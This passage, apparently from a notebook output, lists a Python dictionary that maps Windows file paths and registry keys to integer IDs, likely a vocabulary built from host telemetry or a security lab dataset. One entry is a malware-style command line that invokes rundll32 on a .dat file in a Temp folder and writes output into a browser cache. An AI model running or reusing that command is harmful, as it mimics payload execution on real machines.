       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 447,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data': 448,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\uk': 449,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache': 450,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 451,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\RoamingState\\\\*': 452,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\ca': 453,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Temp\\\\MozillaBackgroundTask-308046B0AF4A39CB-backgroundupdate-2\\\\crashes\\\\.git': 454,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\bg-BG\\\\*': 455,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCache\\\\*': 456,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-OM\\\\.git': 457,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneVideo_8wekyb3d8bbwe\\\\LocalState\\\\*': 458,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\he\\\\*': 459,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Google\\\\.git': 460,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\.git': 461,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\LocalCache\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\.git': 462,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\LocalCache\\\\*': 463,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\Media Player\\\\.git': 464,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Crash Reports\\\\*': 465,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\en': 466,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\A80FBT22\\\\.git': 467,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\archived\\\\.git': 468,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Framework.2.2_8wekyb3d8bbwe\\\\AC\\\\*': 469,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VCLibs.140.00_8wekyb3d8bbwe\\\\AC\\\\*': 470,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\LocalCache': 471,\n",
       " 'C:\\\\Users\\\\jenniferbaxter\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\is\\\\*': 472,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\Contacts\\\\.git': 473,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 474,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\Settings': 475,\n",
       " 'C:\\\\Users\\\\mitchellteresa\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Network Shortcuts\\\\*': 476,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 477,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Xbox.TCUI_8wekyb3d8bbwe\\\\*': 478,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb': 479,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Microsoft\\\\PlayReady\\\\Internet Explorer\\\\InPrivate\\\\.git': 480,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState': 481,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 482,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings\\\\.git': 483,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 484,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\LogoImages': 485,\n",
       " 'C:\\\\Users\\\\faulkneramy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\*': 486,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApiGroup\\\\.git': 487,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Roaming\\\\Mozilla\\\\Extensions': 488,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\CloudStore\\\\.git': 489,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{A990AE9F-A03B-4e80-94BC-9912D7504104}\\\\DefinitionFlags': 490,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Microsoft\\\\Windows Sidebar\\\\Gadgets\\\\.git': 491,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\Settings\\\\.git': 492,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\CloudStore\\\\*': 493,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af\\\\.git': 494,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\Win10-AD\\\\scripts': 495,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 496,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\AppData\\\\*': 497,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AppData\\\\.git': 498,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.3_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 499,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.People_8wekyb3d8bbwe\\\\SystemAppData': 500,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 501,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\AutoLaunchProtocolsComponent\\\\.git': 502,\n",
       " 'C:\\\\Users\\\\barnescindy\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.6_8wekyb3d8bbwe\\\\AC\\\\*': 503,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Temp\\\\vmware-dkelly\\\\*': 504,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Feature Engagement Tracker\\\\AvailabilityDB\\\\.git': 505,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sl\\\\*': 506,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 507,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\WinX\\\\Group2\\\\.git': 508,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\Update\\\\*': 509,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\js\\\\.git': 510,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\Settings': 511,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\RoamingState\\\\.git': 512,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\LocalCache\\\\*': 513,\n",
       " 'HKCR\\\\CLSID\\\\{06EEE834-461C-42c2-8DCF-1502B527B1F9}\\\\InProcServer32\\\\ThreadingModel': 514,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Win32WebViewHost_cw5n1h2txyewy\\\\LocalState': 515,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\GPUCache': 516,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\LocalState': 517,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\Searches': 518,\n",
       " 'C:\\\\Users\\\\ndalton\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\sl': 519,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Crashpad': 520,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\fr': 521,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.LockApp_cw5n1h2txyewy\\\\AC\\\\INetHistory': 522,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 523,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Packages\\\\windows.immersivecontrolpanel_cw5n1h2txyewy\\\\.git': 524,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\nl-BE\\\\*': 525,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 526,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 527,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\*': 528,\n",
       " 'C:\\\\Users\\\\fitzgeraldleslie\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\zh_TW\\\\*': 529,\n",
       " 'C:\\\\Windows\\\\assembly\\\\NativeImages_v4.0.30319_64\\\\System.Core\\\\dbf675a2e7564fd29ec8b82b29a1a2fe\\\\System.Core.ni.dll.aux': 530,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Roaming\\\\Microsoft\\\\SystemCertificates': 531,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\SystemAppData\\\\*': 532,\n",
       " 'HKLM\\\\HARDWARE\\\\DEVICEMAP\\\\VIDEO\\\\MaxObjectNumber': 533,\n",
       " 'C:\\\\Users\\\\fgarrison\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Accessories': 534,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\Settings': 535,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\*': 536,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\bg\\\\.git': 537,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-029\\\\*': 538,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\AppData\\\\.git': 539,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\wasm\\\\*': 540,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.UI.Xaml.2.0_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\.git': 541,\n",
       " 'C:\\\\Users\\\\client1\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\AC\\\\Temp\\\\*': 542,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 543,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-SY\\\\*': 544,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\LocalState': 545,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\Temp': 546,\n",
       " 'HKCU\\\\Software\\\\Classes\\\\Local Settings\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\AppModel\\\\Repository\\\\Packages\\\\Microsoft.WindowsFeedbackHub_1.2106.1801.0_x64__8wekyb3d8bbwe\\\\App\\\\Capabilities': 547,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AppData\\\\*': 548,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 549,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC': 550,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.1.7_8wekyb3d8bbwe\\\\AC\\\\Temp': 551,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 552,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\TempState\\\\.git': 553,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 554,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxApp_8wekyb3d8bbwe\\\\LocalState\\\\*': 555,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 556,\n",
       " 'C:\\\\Users\\\\gardnerjoseph\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-LU': 557,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\AC\\\\INetCookies': 558,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Local\\\\Packages\\\\c5e2524a-ea46-4f67-841f-6a9465d9d515_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 559,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\pt_BR': 560,\n",
       " 'C:\\\\Users\\\\uanderson\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\TempState\\\\.git': 561,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{6f0ed44a-72bc-450e-b61d-7995493fee62}\\\\.git': 562,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\RoamingState': 563,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default\\\\Sessions\\\\*': 564,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\lt\\\\.git': 565,\n",
       " 'C:\\\\Users\\\\jonathan15\\\\AppData\\\\Roaming\\\\Microsoft\\\\MMC\\\\*': 566,\n",
       " 'C:\\\\Users\\\\yjones\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\mt-MT\\\\.git': 567,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\fr-SN\\\\.git': 568,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\ZxcvbnData': 569,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\af': 570,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell': 571,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\LocalCache': 572,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-BH': 573,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\r7js9xmv.default\\\\.git': 574,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\th\\\\.git': 575,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 576,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe\\\\*': 577,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}\\\\.git': 578,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\Settings': 579,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameOverlay_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\.git': 580,\n",
       " 'echo rundll32.exe  C:\\\\Users\\\\ADMINI~1\\\\AppData\\\\Local\\\\Temp\\\\htpd.dat, bogus > C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\INetCache\\\\IE\\\\WIKWAFRE\\\\f[1].txt': 581,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ParentalControls_cw5n1h2txyewy\\\\AC\\\\INetCookies': 582,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdgeDevToolsClient_8wekyb3d8bbwe\\\\*': 583,\n",
       " 'C:\\\\Users\\\\mariahwilson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\fi\\\\.git': 584,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 585,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\TempState\\\\.git': 586,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\1033': 587,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\lv\\\\*': 588,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 589,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Packages\\\\NcsiUwpApp_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 590,\n",
       " 'C:\\\\Users\\\\annetteyoung\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalState\\\\*': 591,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Microsoft3DViewer_8wekyb3d8bbwe\\\\AC\\\\INetCache': 592,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\*': 593,\n",
       " 'C:\\\\Users\\\\devon54\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\hr\\\\*': 594,\n",
       " 'C:\\\\Users\\\\perezkenneth\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 595,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\es\\\\*': 596,\n",
       " 'C:\\\\Users\\\\swansontaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\.git': 597,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 598,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extension Scripts': 599,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\SystemAppData\\\\.git': 600,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe\\\\AppData\\\\.git': 601,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\de': 602,\n",
